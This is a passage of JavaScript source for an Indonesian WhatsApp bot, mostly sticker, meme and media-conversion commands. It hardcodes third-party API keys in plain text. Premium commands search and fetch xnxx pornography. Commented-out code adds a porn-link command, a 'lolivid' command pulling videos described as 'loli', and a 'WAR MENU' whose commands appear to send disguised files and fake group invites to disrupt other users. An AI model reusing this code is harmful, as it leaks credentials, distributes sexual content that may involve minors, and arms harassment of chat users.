						`https://api.zeks.xyz/api/iguser?apikey=${setting.zekskey}&q=${query}`
						)
				get_result =
					get_result
					.result
				teks =
					`*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
				for (let i =
					0; i <
					get_result
					.length; i++
					) {
					teks +=
						`*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
				}
				ini_buffer =
					await getBuffer(
						get_result[
							0]
						.profile_pic
						)
				varo
					.sendMessage(
						from,
						ini_buffer,
						image, {
							quoted: mek,
							caption: teks
						})
			} catch {
				reply(
					`Maaf username ${query} tidak ditemukan`)
			}
			break*/

		/*case 'ffstalk':
			if (args.length ==
				0) return reply(
				`Idnya mana kak?`
				)
			ff_id = args[0]
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/freefire/${ff_id}?apikey=vxro2k21`
					)
			reply(`nih kak`)
			break*/
			//------------------< Sticker/Tools >-------------------

			case 'dadu':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			    damdu = await getBuffer(`https://api.lolhuman.xyz/api/sticker/dadu?apikey=vxro2k21`)
				varo.sendMessage(from, damdu, sticker, {quoted: mek})
				break
			case 'doge':
				if (isBanned) return reply(mess.baned)
				if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
				damdu = await getBuffer(`https://api.lolhuman.xyz/api/sticker/anjing?apikey=vxro2k21`)
				varo.sendMessage(from, damdu, sticker, {quoted: mek})
				break

				case 'patrick':
					if (isBanned) return reply(mess.baned)
					if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
					damdu = await getBuffer(`https://api.lolhuman.xyz/api/sticker/patrick?apikey=vxro2k21`)
					varo.sendMessage(from, damdu, sticker, {quoted: mek})
					break
		case 'gura':
		case 'gawrgura':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			damdu = await getBuffer(`https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=vxro2k21`)
			varo.sendMessage(from, damdu, sticker, {quoted: mek})
			break
		case 'animestick':
		case 'stickeranime':
			if (isBanned) return reply(mess.baned)
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			reply(mess.wait)
			fetch(
					'https://raw.githubusercontent.com/rashidsiregar28/data/main/animestick')
				.then(res => res
					.text())
				.then(body => {
					let todd =
						body
						.split(
							"\n"
							);
					let pjrr =
						todd[
							Math
							.floor(
								Math
								.random() *
								todd
								.length
								)
							];
					sendWebp
						(from,
							pjrr
							)
				})
			break
		case 'telesticker':
		case 'telestiker':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (!q) return reply(
				`Command untuk mencari sticker dari Telegram\n\nExample : ${prefix+command} https://t.me/addstickers/LINE_Menhera_chan_ENG`
				)
			if (isGroup) return reply(`Command ini hanya bisa digunakan dalam private chat`)
			reply(mess.wait)
			ini_url =
				await fetchJson(
					`https://api.lolhuman.xyz/api/telestick?apikey=vxro2k21&url=${args[0]}`
					)
			ini_sticker =
				ini_url.result
				.sticker
			reply('Sending ' +
				ini_sticker
				.length +
				' stickers...'
				)
			for (sticker_ in
				ini_sticker) {
				ini_buffer =
					await getBuffer(
						ini_sticker[
							sticker_
							])
				varo
					.sendMessage(
						from,
						ini_buffer,
						sticker, {}
						)
			}
			break
		case 'emoji':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (!q) return reply(`Command untuk membuat sticker emoji\n\nExample : ${prefix+command} 😱`)
			qes = args.join(' ')
			reply(mess.wait)
			emoji.get(`${qes}`)
				.then(emoji => {
					teks =
						`${emoji.images[4].url}`
					sendStickerFromUrl
						(from,
							`${teks}`
							)
					console
						.log(
							teks
							)
				})
			break
		case 'ttp':
			if (isBanned) return reply(mess.baned)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			if (args.length < 1)
				return reply(
					`Command untuk membuat text to sticker\n\nExample : ${prefix+command} VXROBOT`
					)
			woy = args.join(" ")
			reply(mess.wait)
			anjay =
				`https://api.lolhuman.xyz/api/ttp?apikey=vxro2k21&text=${woy}`
			sendStickerFromUrl(
				from, anjay)
			break
		/*case 'stickwasted':
			//if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply(mess.limit)
			if (mek.message
				.extendedTextMessage !=
				undefined || mek
				.message
				.extendedTextMessage !=
				null) {
				ger = JSON
					.parse(JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo
				reply(mess.wait)
				owgi =
					await varo
					.downloadMediaMessage(
						ger)
				await fs
					.writeFileSync(
						`./stickwasted.jpeg`,
						owgi)
				var imgbb =
					require(
						'imgbb-uploader'
						)
				anu =
					await imgbb(
						"3395a377ebac7e9f744c3683b44a2a59",
						'./stickwasted.jpeg'
						)
				teks =
					`${anu.display_url}`
				sendStickerFromUrl
					(from,
						`https://some-random-api.ml/canvas/wasted?avatar=${teks}`,
						)
				fs.unlinkSync(
					'./stickwasted.jpeg'
					)
			}
			break*/
		case 'attp':
			if (isBanned) return reply(mess.baned)
			if (args.length ==
				0) return reply(
					`Command untuk membuat text to sticker(gif)\n\nExample : ${prefix+command} VXROBOT`
				)
			buffer =
				await getBuffer(
					`https://api.lolhuman.xyz/api/attp?apikey=vxro2k21&text=${encodeURI(q)}`
					)
			varo.sendMessage(
				from,
				buffer,
				sticker, {
					quoted: mek
				})
			break
		/*case 'ttg':
			if (!q) return await reply(
				mess
				.wrongFormat
				)
			reply(mess.wait)
			sendWebp(from,
					`https://api.vhtear.com/textxgif?text=${q}&apikey=${setting.vhtearkey}`
					)
				.then(() =>
					console.log(
						'Success creating GIF!'
						))
				.catch(async (
						err
						) => {
						console
							.error(
								err
								)
						reply
							(
								'Error!')
					})
			break
		case 'loliv':
		case 'lolivid':
		case 'lolivideo':
			reply(mess.wait)
			anu =
				await fetchText(
					'https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt'
					)
				.then(async (
					body
					) => {
					anu =
						body
						.split(
							'\n'
							)
					anu =
						anu[Math
							.floor(
								Math
								.random() *
								anu
								.length
								)
							]
					sendMediaURL
						(from,
							anu
							)
				})
				.catch(async (
						err
						) => {
						console
							.error(
								err
								)
						reply
							(
								`${err}`)
					})
			break*/
		case 'sticker':
		case 'stiker':
		case 's':
			if (isBanned) return reply(mess.baned)
			if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            const media = await varo.downloadAndSaveMediaMessage(encmedia)
                ran = '666.webp'
                await ffmpeg(`./${media}`)
                .input(media)
                .on('start', function (cmd) {
                     console.log(`Started : ${cmd}`)
                })
                .on('error', function (err) {
                 console.log(`Error : ${err}`)
                fs.unlinkSync(media)
                reply('error')
                })
                .on('end', function () {
                console.log('Finish')
                varo.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
                } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
                const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                const media = await varo.downloadAndSaveMediaMessage(encmedia)
            ran = '999.webp'
            reply(mess.wait)
            await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function (cmd) {
            console.log(`Started : ${cmd}`)
            })
            .on('error', function (err) {
            console.log(`Error : ${err}`)
            fs.unlinkSync(media)
            tipe = media.endsWith('.mp4') ? 'video' : 'gif'
            reply(`Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function () {
            console.log('Finish')
            varo.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
            fs.unlinkSync(media)
            fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
                .toFormat('webp')
                .save(ran)
            } else {
				reply(
					`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
			}
			break
		case 'take':
		case 'colong':
		case 'stickerwm':
		case 'stikerwm':
		case 'swm':
			if (isBanned) return reply(mess.baned)
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (!
				isQuotedSticker && !isQuotedImage)
				return reply(
					`Command untuk membuat sticker with WaterMark\n\nExample : ${prefix+command} Author|Packname`
					)
			encmedia = JSON
				.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			media = await varo
				.downloadAndSaveMediaMessage(
					encmedia)
			anu = args.join(' ')
				.split('|')
			satu = anu[0] !==
				'' ? anu[0] :
				`${pushname}`
			dua = typeof anu[
				1] !==
				'undefined' ?
				anu[1] : `UwU`
			require(
					'./VXROLB/fetch.js')
				.createExif(
					satu, dua)
			require(
					'./VXROLB/fetch.js')
				.modStick(media,
					varo, mek,
					from)
			break
		/*case 'delwm':
			if (!
				isQuotedSticker)
				return reply(
					'Stiker aja om'
					)
			encmedia = JSON
				.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			media = await varo
				.downloadAndSaveMediaMessage(
					encmedia)
			anu = args.join(' ')
				.split('|')
			satu = anu[0] !==
				'' ? anu[0] : ``
			dua = typeof anu[
				1] !==
				'undefined' ?
				anu[1] : ``
			require(
					'./VXROLB/fetch.js')
				.createExif(
					satu, dua)
			require(
					'./VXROLB/fetch.js')
				.modStick(media,
					varo, mek,
					from)
			break
		case 'stikerwm':
		case 'stickerwm':
		case 'swm':
			var a = arg.split(
				"|")[0];
			var b = arg.split(
				"|")[1];
			if (isMedia && !mek
				.message
				.videoMessage ||
				isQuotedImage) {
				const encmedia =
					isQuotedImage ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				media =
					await varo
					.downloadAndSaveMediaMessage(
						encmedia
						)
				await createExif
					(a, b)
				out = getRandom(
					'.webp')
				ffmpeg(media)
					.on('error',
						(e) => {
							console
								.log(
									e
									)
							varo
								.sendMessage(
									from,
									'Terjadi kesalahan',
									'conversation', {
										quoted: mek
									}
									)
							fs.unlinkSync(
								media
								)
						})
					.on('end',
					() => {
						_out =
							getRandom(
								'.webp'
								)
						spawn
							('webpmux',
								['-set',
									'exif',
									'./VXROST/data.exif',
									out,
									'-o',
									_out
								]
								)
							.on('exit',
								() => {
									varo
										.sendMessage(
											from,
											fs
											.readFileSync(
												_out
												),
											'stickerMessage', {
												quoted: mek
											}
											)
									fs.unlinkSync(
										out
										)
									fs.unlinkSync(
										_out
										)
									fs.unlinkSync(
										media
										)
								}
								)
					})
					.addOutputOptions(
						[`-vcodec`,
							`libwebp`,
							`-vf`,
							`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`
						])
					.toFormat(
						'webp')
					.save(out)
			} else if ((
					isMedia &&
					mek.message
					.videoMessage
					.seconds <
					11 ||
					isQuotedVideo &&
					mek.message
					.extendedTextMessage
					.contextInfo
					.quotedMessage
					.videoMessage
					.seconds <
					11) && args
				.length == 0) {
				const encmedia =
					isQuotedVideo ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				const media =
					await varo
					.downloadAndSaveMediaMessage(
						encmedia
						)
				pe = args.join(
					'')
				var a = pe
					.split("|")[
						0];
				var b = pe
					.split("|")[
						1];
				await createExif
					(a, b)
				out = getRandom(
					'.webp')
				ffmpeg(media)
					.on('error',
						(e) => {
							console
								.log(
									e
									)
							varo
								.sendMessage(
									from,
									'Terjadi kesalahan',
									'conversation', {
										quoted: mek
									}
									)
							fs.unlinkSync(
								media
								)
						})
					.on('end',
					() => {
						_out =
							getRandom(
								'.webp'
								)
						spawn
							('webpmux',
								['-set',
									'exif',
									'./VXROST/data.exif',
									out,
									'-o',
									_out
								]
								)
							.on('exit',
								() => {
									varo
										.sendMessage(
											from,
											fs
											.readFileSync(
												_out
												),
											'stickerMessage', {
												quoted: mek
											}
											)
									fs.unlinkSync(
										out
										)
									fs.unlinkSync(
										_out
										)
									fs.unlinkSync(
										media
										)
								}
								)
					})
					.addOutputOptions(
						[`-vcodec`,
							`libwebp`,
							`-vf`,
							`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`
						])
					.toFormat(
						'webp')
					.save(out)
			} else {
				reply(
					`Kirim gambar dengan caption ${prefix}swm teks|teks atau tag gambar yang sudah dikirim`)
			}
			break*/
		case 'toimg':
			case 'toimage':
				if (isBanned) return reply(mess.baned)
			if (!
				isQuotedSticker)
				return reply(
					'reply stickernya'
					)
			reply(mess.wait)
			encmedia = JSON
				.parse(JSON
					.stringify(
						mek)
					.replace(
						'quotedM',
						'm'))
				.message
				.extendedTextMessage
				.contextInfo
			media = await varo
				.downloadAndSaveMediaMessage(
					encmedia)
			ran = getRandom(
				'.png')
			exec(`ffmpeg -i ${media} ${ran}`,
				(err) => {
					fs.unlinkSync(
						media
						)
					if (err)
						return reply(
							'Gagal, pada saat mengkonversi sticker ke gambar'
							)
					buffer =
						fs
						.readFileSync(
							ran
							)
					varo
						.sendMessage(
							from,
							buffer,
							image, {
								quoted: mek,
								caption: 'Sticker To Image'
							}
							)
					fs.unlinkSync(
						ran
						)
				})
			break
		case 'smeme':
		case 'stcikermeme':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			reply(mess.wait)
			top = arg.split(
				'|')[0]
			bottom = arg.split(
				'|')[1]
			var imgbb = require(
				'imgbb-uploader'
				)
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedImage ||
					isQuotedSticker
					) && args
				.length > 0) {
				ger =
					isQuotedImage ||
					isQuotedSticker ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				owgi =
					await varo
					.downloadAndSaveMediaMessage(
						ger)
				anu =
					await imgbb(
						"cedeb44b8d204947a6833ca1412ca77d",
						owgi)
				teks =
					`${anu.display_url}`
				ranp =
					getRandom(
						'.gif')
				rano =
					getRandom(
						'.webp')
				anu1 =
					`https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
				sendStickerUrl(
					from,
					`${anu1}`
					)
			} else {
				reply(
					`Command untuk membuat sticker meme\n\nExample : ${prefix+command} Atas|Bawah`)
			}
			break
		case "autojoin":
			if (!isOwner && !mek
				.key.fromMe)
				return reply(
					mess.own
					)
			if (args[0] ==
				"on") {
				if (autojoin ==
					true)
				return reply(
						"Sudah aktif!!"
						);
				autojoin = true;
				reply(
					"Sukses mengaktifkan autojoin!");
			} else if (args[
				0] == "off") {
				autojoin =
				false;
				reply(
					"Sukses mematikan autojoin!");
			} else if (!q) {

			}
			break;

		case 'memeimg':
		case 'memegen':
			if (isBanned) return reply(mess.baned)
			if (isLimit(sender,
				isPremium,
				isOwner,
				limitCount,
				limit))
			return reply(
				mess
				.limit)
			if (!isGroup && !isPremium && !isOwner) return sendButLocation(from, 'Bot ini hanya untuk group, mau menggunakan bot secara private? Ayo join member premium vxrobot', `VXROBOT©2022`, {jpegThumbnail:dfrply},[{buttonId:`${prefix}sewabot`,buttonText:{displayText:'JOIN'},type:1}],{contextInfo: { mentionedJid: [sender]}})
			top = arg.split(
				'|')[0]
			bottom = arg.split(
				'|')[1]
			var imgbb = require(
				'imgbb-uploader'
				)
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedImage ||
					isQuotedSticker
					) && args
				.length > 0) {
				reply(mess.wait)
				ger =
					isQuotedImage ||
					isQuotedSticker ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				owgi =
					await varo
					.downloadAndSaveMediaMessage(
						ger)
				anu =
					await imgbb(
						"39d895963468b814fad0514bd28787e2",
						owgi)
				teks =
					`${anu.display_url}`
				ranp =
					getRandom(
						'.gif')
				rano =
					getRandom(
						'.webp')
				anu1 =
					`https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
				sendMediaURL(
					from,
					`${anu1}`,
					mess
					.success
					)
					limitAdd(sender,
						limit)
			} else {
				reply(
					'Gunakan foto/sticker!')
			}
			break
		case 'togif':
			if (isBanned) return reply(mess.baned)
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedSticker
					) && args
				.length == 0) {
				reply(mess.wait)
				encmediaaa =
					isQuotedSticker ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				mediaaa =
					await varo
					.downloadAndSaveMediaMessage(
						encmediaaa
						)
				a = await webp2gifFile(
					mediaaa)
				mp4 =
					await getBuffer(
						a.result
						)
				varo
					.sendMessage(
						from,
						mp4,
						video, {
							mimetype: 'video/gif',
							quoted: mek,
							caption: mess
								.success
						})
				fs.unlinkSync(
					mediaaa)
			} else {
				reply(`Command untuk mengubah sticker ke gif\n\nExample : ${prefix+command} (Reply Sticker Gerak)`)
			}
			break
		case 'tovideo':
			if (isBanned) return reply(mess.baned)
			if ((isMedia && !mek
					.message
					.videoMessage ||
					isQuotedSticker
					) && args
				.length == 0) {
				reply(mess.wait)
				encmediaaa =
					isQuotedSticker ?
					JSON.parse(
						JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo :
					mek
				mediaaa =
					await varo
					.downloadAndSaveMediaMessage(
						encmediaaa
						)
				a = await webp2gifFile(
					mediaaa)
				mp4 =
					await getBuffer(
						a.result
						)
				varo
					.sendMessage(
						from,
						mp4,
						video, {
							mimetype: 'video/mp4',
							quoted: mek,
							caption: mess
								.success
						})
				fs.unlinkSync(
					mediaaa)
			} else {
				reply(`Command untuk mengubah sticker ke video\n\nExample : ${prefix+command} (Reply Sticker Gerak)`)
			}
			break
		case 'tomp3':
			if (isBanned) return reply(mess.baned)
			if (isQuotedVideo ||
				isQuotedAudio) {
				reply(mess.wait)
				encmedia = JSON
					.parse(JSON
						.stringify(
							mek)
						.replace(
							'quotedM',
							'm')
						)
					.message
					.extendedTextMessage
					.contextInfo
				media =
					await varo
					.downloadAndSaveMediaMessage(
						encmedia
						)
				ran = getRandom(
					'.mp3')
				exec(`ffmpeg -i ${media} ${ran}`,
					(
					err) => {
						fs.unlinkSync(
							media
							)
						if (
							err)
							return reply(
								`Err: ${err}`
								)
						buffer453
							=
							fs
							.readFileSync(
								ran
								)
						varo
							.sendMessage(
								from,
								buffer453,
								audio, {
									mimetype: 'audio/mp4',
									quoted: mek
								}
								)
						fs.unlinkSync(
							ran
							)
					})
			} else {
				reply(`Command untuk mengubah video ke audio\n\nExample : ${prefix+command} (Reply Video)`)
			}
			break


			//---------------------<RANDOMGAMBAR>_-----------

			//------------------<18+ Menu>-----------------------   
		/*case 'randombokep':
			bokep = body.slice(
				1)
			const bo = [
				'https://www.mediafire.com/download/8hnhjcf3pseubgy',
				'https://www.mediafire.com/download/cty9phda3d1s62u',
				'https://www.mediafire.com/download/8hnhjcf3pseubgy'
			]
			const kep = bo[Math
				.floor(Math
					.random() *
					bo
					.length)
				]
			varo.sendMessage(
				from,
				'*PERMINTAAN:* ' +
				bokep +
				'\n*DOSA TANGGUNG PRIBADI*\n*NI BRO FREE BUAT KAMU DOWNLOAD SENDIRI:* ' +
				kep, text, {
					quoted: ftoko,
					caption: `NI BOKEP SAYA DAPAT DARI *©KurrXd* DOSA TANGGUNG SENDIRI🗿`
				})
			break*/
		case 'xnxx':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (args.length ==
				0) return reply(
					`Command untuk mendapatkan detail video dari website xnxx.com\n\nExample : ${prefix+command} https://www.xnxx.com/video-uy5a73b/mom_is_horny_-_brooklyn`
				)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`http://api.lolhuman.xyz/api/xnxx?apikey=vxro2k21&url=${query}`
					)
			get_result =
				get_result
				.result
			ini_txt =
				`Title : ${get_result.title}\n`
			ini_txt +=
				`Duration : ${get_result.duration}\n`
			ini_txt +=
				`View : ${get_result.view}\n`
			ini_txt +=
				`Rating : ${get_result.rating}\n`
			ini_txt +=
				`Like : ${get_result.like}\n`
			ini_txt +=
				`Dislike : ${get_result.dislike}\n`
			ini_txt +=
				`Comment : ${get_result.comment}\n`
			ini_txt +=
				`Tag : ${get_result.tag.join(", ")}\n`
			ini_txt +=
				`Description : ${get_result.description}\n`
			ini_txt +=
				"Link : \n"
			ini_link =
				get_result.link
			for (var x of
					ini_link) {
				ini_txt +=
					`${x.type} - ${x.link}\n\n`
			}
			thumbnail =
				await getBuffer(
					get_result
					.thumbnail)
			varo.sendMessage(
				from,
				thumbnail,
				image, {
					quoted: mek,
					caption: ini_txt
				})
			break
		case 'xnxxsearch':
			if (!isPremium) return reply(`Command ini hanya untuk member premium\n\nMau join member premium? ketik *${prefix}sewabot* untuk informasi lebih lanjut`)
			if (args.length ==
				0) return reply(
					`Command untuk mencari video 18+ dari https://xnxx.com\n\nExample : ${prefix+command} Japanese`
				)
			query = args.join(
				" ")
			get_result =
				await fetchJson(
					`https://api.lolhuman.xyz/api/xnxxsearch?apikey=vxro2k21&query=${query}`
					)
			get_result =
				get_result
				.result
			/*    ini_txt = ""
			      for (var x of get_result) {
			          ini_txt += `Title : ${x.title}\n` 
			          ini_txt += `Views : ${x.views}\n`
			          ini_txt += `Duration : ${x.duration}\n`
			          ini_txt += `Uploader : ${x.uploader}\n`
			          ini_txt += `Link : ${x.link}\n`                        
			      } 
			      let yah = `${ini_txt}`*/
			list = []
			nombor = 1
			startnum = 0
			for (var x of
					get_result) {
				const yy = {
					title: `Title Ke` +
						nombor++,
					rows: [
					{
						title: `${x.title}${[startnum++]}`,
						description: `Duration: ${x.duration}\nViews: ${x.views}\nUpload: ${x.uploader}`,
						rowId: `${prefix}xnxxdown ${x.link}`
					}]
				}
				list.push(yy)
			}
			listmsg(from,
				`${ucapanWaktu} @${sender.split('@')[0]}`,
				`Silahkan pilih salah satu untuk didownload`,
				list)
			break

		/*case 'asupan1':
			varo
				.updatePresence(
					from,
					Presence
					.composing)
			reply(mess.wait)
			data = fs
				.readFileSync(
					'./VXROLB/asupan.js'
					);
			jsonData = JSON
				.parse(data);
			randIndex = Math
				.floor(Math
					.random() *
					jsonData
					.length);
			randKey = jsonData[
				randIndex];
			asupan =
				await getBuffer(
					randKey
					.result)
			varo.sendMessage(
				from,
				asupan,
				video, {
					quoted: mek,
					caption: '```ASUPAN NIH:V```'
				})
			break
		case 'asupan2':
			varo
				.updatePresence(
					from,
					Presence
					.composing)
			reply(mess.wait)
			data = fs
				.readFileSync(
					'./VXROLB/asupan2.js'
					);
			jsonData = JSON
				.parse(data);
			randIndex = Math
				.floor(Math
					.random() *
					jsonData
					.length);
			randKey = jsonData[
				randIndex];
			asupan =
				await getBuffer(
					randKey
					.result)
			varo.sendMessage(
				from,
				asupan,
				video, {
					quoted: mek,
					caption: '```ASUPAN NIH:V```'
				})
			break
			//------------------<WAR MENU>---------------    
		case 'pvp':
			if (!mek.key
				.fromMe && !
				isOwner) return
			tapib1 = fs
				.readFileSync(
					'./VXROMD/audio/numayei.mp3'
					)
			varo.sendMessage(
				from,
				tapib1,
				document, {
					quoted: mek,
					filename: `${botname} ~ 404 ${vipi}.mp3`,
					mimetype: 'audio/application'
				})
			await reply(
				'Bang mau nanya'
				)
			break
		case 'pgp':
			if (!isOwner && !mek
				.key.fromMe)
				return
			buf = Mfake
			imeu = await varo
				.prepareMessage(
					'0@s.whatsapp.net',
					buf, image)
			imeg = imeu.message
				.imageMessage
			res = await varo
				.prepareMessageFromContent(
					from, {
						"groupInviteMessage": {
							"groupJid": "85296556573-1328272333@g.us",
							"inviteCode": "wFHwtOxGQN8OwK2x",
							"inviteExpiration": "162533333338378",
							"groupName": `${botname} ~ 404 ${vipi}`,
							"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCADIAMgDASIAAhEBAxEB/8QAHAAAAQUBAQEAAAAAAAAAAAAABAADBQYHAgEI/8QAQBAAAgEDAgQDBAgEBAUFAAAAAQIDAAQRBSEGEjFBE1FhByJxgRQyUpGhscHRFSNC4SRDYvAWM2NyojRzgrLi/8QAGQEAAwEBAQAAAAAAAAAAAAAAAAECAwQF/8QAJxEAAgICAgIBBAIDAAAAAAAAAAECEQMxEiEEQRMiMlFhkaEFcYH/2gAMAwEAAhEDEQA/AJmRqFkOdh1rtztTEjd+9MRGXxO9Q0pwSal7vLZABJOwA3p6w4T1a/IIt/AjP9U3u/h1oGOcNXkY0q8sQj+NOT74GQFIx/v41axrVhDbxRyXG+MEsuO1O6FwbbacPEklkmuD1Ye6o+Ary64KsZySGmDHuXzQBO6RKj2MRUho5F5wexBNEtZK8jOsvIW35StB6fBd2NtBbrAkkcKhFxJjIHTqKOFzKN2snz/pZSabVjTGzYSA7SIa8axnHTlPzp1rwEe/bXK/Bc0hqFugwwnX/uib9qVIdsYNrOP8vPwNcNFKv1o2+6iDqNkzZ+liPHYnGfvoDXeJbDSLB7qW5V1H1VRgSx8qKQWxrULyHT7WSe5JjiQZYms81X2msj8um2KMv2536/IfvVP4p4mvuI7xpbuZlt8+5AG91R+pqDDJnlHMR91RQy4z+0TW5GHI1tEPJE/eh/8AjLiB3DG7OP8A2xiq8sSBc7ketd5A+ocfCgC5abx7ewsPp0aMD/Um34VeNG4htdUUGNwJiN0J3rEzIc7tn5Ubp1vf/SEk09iGByMGk+gXZu5ZSobJwd81Fa7fx2VhNO2SFHQd/Sq3YcXIgW3vAIplAByM70Dx/qgl0NBC4bncczA7DairDRRtU1GW